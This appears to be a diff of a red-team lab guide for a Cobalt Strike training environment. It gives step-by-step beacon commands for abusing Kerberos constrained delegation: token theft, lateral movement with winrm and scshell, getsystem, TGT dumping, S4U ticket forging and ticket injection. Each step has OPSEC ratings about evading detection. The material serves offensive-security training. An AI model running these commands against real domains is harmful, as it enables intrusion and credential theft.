@@ -15,7 +15,7 @@
     ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
     ```
 
-    > `OPSEC-SAFE` — BOF, runs in beacon thread, no child process.
+    > OPSEC-🟢SAFE — BOF, runs in beacon thread, no child process.
 
 ⚠️ Expected output: `lon-ws-1$` with `msDS-AllowedToDelegateTo: time/lon-fs-1`. The service is `time`, not `cifs` — that is the point of this lab.
 
@@ -25,53 +25,58 @@
 
 Goal: get a beacon running as SYSTEM on `lon-ws-1` so we can access the machine account logon session (LUID `0x3e7`) and dump its TGT.
 
-1. On the existing beacon, open the process browser and find a process owned by `rsteel` (or any domain user with local admin on `lon-ws-1`):
+1. Find a process owned by `rsteel` (Workstation Admin on lon-ws-1):
 
-    ```Beacon-nocolor
-    process_browser
+    ```cs
+    beacon> ps
+    // Look for cmd.exe, mmc.exe owned by CONTOSO\rsteel
     ```
 
-2. Steal the token of that process:
+2. Steal the token:
 
-    ```Beacon-nocolor
-    steal_token <pid>
+    ```cs
+    beacon> steal_token <rsteel-pid>    // OPSEC-🟢SAFE — no logon event, no child process
+    beacon> getuid                       // confirm CONTOSO\rsteel
     ```
 
-    > `OPSEC-SAFE` — token impersonation in beacon thread, no process spawn.
+3. Set spawnto before jumping:
 
-3. Set spawnto before jumping to avoid default `rundll32.exe` child process.
-   `ak-settings` is the Aggressor Kit command loaded in the CRTO lab environment:
-
-    ```Beacon-nocolor
-    ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
+    ```cs
+    beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
+    // dllhost.exe = COM surrogate — blends with normal system activity
+    // Standard CS equivalent if ak-settings not loaded:
+    beacon> spawnto x64 %windir%\sysnative\dllhost.exe
     ```
 
-    Equivalent standard CS command (if Aggressor Kit is not loaded):
+4. Jump to lon-ws-1 — winrm64 first (retry once on ERROR_FILE_NOT_FOUND), then scshell64:
 
-    ```Beacon-nocolor
-    spawnto x64 %windir%\sysnative\dllhost.exe
+    ```cs
+    // OPSEC-🟢SAFE — preferred, no service, no Event 7045/7040
+    beacon> jump winrm64 lon-ws-1 smb_custom
+    // If ERROR_FILE_NOT_FOUND → wait 10-15s → retry once before falling to scshell64
+
+    // OPSEC-🟠CAUTION — fallback, Event 7040 x2, transient disk write
+    beacon> jump scshell64 lon-ws-1 smb_custom
+
+    beacon> rev2self    // drop rsteel token on source beacon after jump succeeds
     ```
 
-    > `OPSEC-CAUTION` — sets the sacrificial process for any subsequent fork & run commands. `dllhost.exe` is preferred over `svchost.exe` as it is a common host for COM surrogate processes and blends better with normal system activity.
+5. On the new lon-ws-1 beacon — verify SYSTEM context:
 
-4. Move laterally to `lon-ws-1` — prefer WinRM, fall back to scshell if WinRM is blocked:
-
-    ```Beacon-nocolor
-    # OPSEC-SAFE (preferred) — WinRM, no service modification, no disk write on target
-    
-    jump winrm64 lon-ws-1 smb
-
-    # OPSEC-CAUTION (fallback) — SCShell modifies existing service ImagePath via SCM
-    # Generates: Event 7040 (service config changed), 4697, 4688
-    
-    jump scshell64 lon-ws-1 smb
+    ```cs
+    beacon> getuid
     ```
 
-5. Interact with the new beacon on `lon-ws-1`. Verify running as SYSTEM:
+    **If `getuid` returns `CONTOSO\rsteel` (not SYSTEM)** — this happens when `jump winrm64` is used. WinRM injects into `wsmprovhost.exe` running as the authenticated user, not SYSTEM. Escalate:
 
-    ```Beacon-nocolor
-    getuid
+    ```cs
+    beacon> getsystem    // OPSEC-🟠CAUTION — named pipe impersonation from admin context
+    beacon> getuid       // confirm NT AUTHORITY\SYSTEM
     ```
+
+    > `steal_token <SYSTEM-pid>` will fail with `ERROR_ACCESS_DENIED` from a rsteel wsmprovhost.exe context — even though rsteel is local admin, the WinRM session token lacks `SeDebugPrivilege`. Use `getsystem` instead.
+    >
+    > `jump scshell64` lands as SYSTEM directly (runs via service context) — `getsystem` not needed.
 
 ===
 
@@ -81,21 +86,28 @@ Goal: get a beacon running as SYSTEM on `lon-ws-1` so we can access the machine 
 
 LUID `0x3e7` is the machine account logon session — always present on any domain-joined host, always SYSTEM-accessible.
 
-```Beacon-nocolor
-krb_dump /luid:3e7 /service:krbtgt
+```cs
+beacon> krb_dump /luid:3e7 /service:krbtgt
 ```
 
-> `OPSEC-CAUTION` — BOF (no child process). Uses `LsaCallAuthenticationPackage` Kerberos API, not a raw LSASS memory read. EDR hooks on this API call will still fire.
+> OPSEC-🟠CAUTION — BOF, uses `LsaCallAuthenticationPackage` Kerberos API — not a raw LSASS memory read, but EDR hooks on this API will still fire.
 
-⚠️ Copy the entire base64 TGT output — you pass it to `krb_s4u` in the next step.
+> ⚠️ **Lab-confirmed (2026-04-19):** Use `/luid:3e7` — do NOT prefix with `0x`. Kerbeus-BOF rejects `/luid:0x3e7` and returns `[x] Invalid luid`.
 
-Optionally verify the ticket before using it:
+⚠️ Copy the entire base64 TGT blob — passed to `krb_s4u` next.
 
-```Beacon-nocolor
-krb_describe /ticket:[base64-TGT]
+> **Check `krb_triage` output first — DA TGT may already be cached:**
+> After `getsystem`, `krb_triage` shows all sessions on the host. If a Domain Admin TGT is cached (e.g. `Administrator @ CONTOSO.COM | krbtgt/CONTOSO.COM`), dump it directly — skip S4U entirely:
+> ```cs
+> beacon> krb_dump /user:Administrator /service:krbtgt
+> ```
+> Lab confirmed (2026-04-19): Administrator TGT was cached on lon-ws-1 at LUID `0x7940d`. Direct DA path — no delegation abuse required.
+
+Verify ticket before using:
+
+```cs
+beacon> krb_describe /ticket:[base64-TGT]    // OPSEC-🟢SAFE — BOF, read-only
 ```
-
-> `OPSEC-SAFE` — BOF, read-only ticket inspection.
 
 ---
 
@@ -107,7 +119,7 @@ Use the machine TGT to request a service ticket for the delegated SPN (`time/lon
 krb_s4u /ticket:[base64-TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
 ```
 
-> `OPSEC-SAFE` — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write.
+> OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write.
 
 ⚠️ `/service:time/lon-fs-1` must exactly match the value in `msDS-AllowedToDelegateTo` from enumeration — if the delegation target is different in your lab, substitute accordingly.
 
@@ -133,23 +145,31 @@ Run this on the attacker CS client (local PowerShell — **not** via beacon):
 
 Back in the beacon on `lon-ws-1`:
 
-```Beacon-nocolor
-make_token CONTOSO\Administrator FakePass!
-kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
-ls \\lon-fs-1\c$
+```cs
+// make_token is OPTIONAL when beacon is SYSTEM — lab-confirmed (2026-04-19)
+// kerberos_ticket_use injects directly into the SYSTEM logon session
+// lon-fs-1 sees Administrator authenticating regardless of local session identity
+
+// Option A — skip make_token (OPSEC-🟢SAFE — no Event 4648, lab-confirmed working)
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
+beacon> ls \\lon-fs-1\c$
+
+// Option B — with make_token (OPSEC-🟠CAUTION — Event 4648 logged, cleaner session)
+beacon> make_token CONTOSO\Administrator FakePass!
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-fs-1.kirbi
+beacon> ls \\lon-fs-1\c$
 ```
 
-> `OPSEC-SAFE` — `make_token` creates a sacrificial logon session in-memory. `kerberos_ticket_use` injects the ticket into it — no disk write on target, no child process.
+> **Why Option A works:** The injected `cifs/lon-fs-1` service ticket is presented to lon-fs-1 during the network auth. The remote server only validates the Kerberos ticket — it never checks what the local logon session identity is. SYSTEM context is sufficient to hold and present the injected ticket.
 
-⚠️ `ls \\lon-fs-1\c$` should succeed. If it fails with `ACCESS_DENIED`, verify:
-- `getuid` — confirm token is set
-- `run klist` — confirm the `cifs/lon-fs-1` ticket is present in the session
-- The SPN in `krb_s4u` exactly matches what ldapsearch returned
+⚠️ If `ls \\lon-fs-1\c$` returns `ACCESS_DENIED`:
+- `krb_triage` — confirm `cifs/lon-fs-1` ticket is present in current session
+- Verify SPN in `krb_s4u` exactly matches `msDS-AllowedToDelegateTo` from ldapsearch
+- Check ticket expiry with `krb_describe /ticket:[base64]`
 
-Drop impersonation when done:
-
-```Beacon-nocolor
-rev2self
+```cs
+beacon> rev2self
+beacon> kerberos_ticket_purge    // purge injected ticket from SYSTEM session
 ```
 
 ===
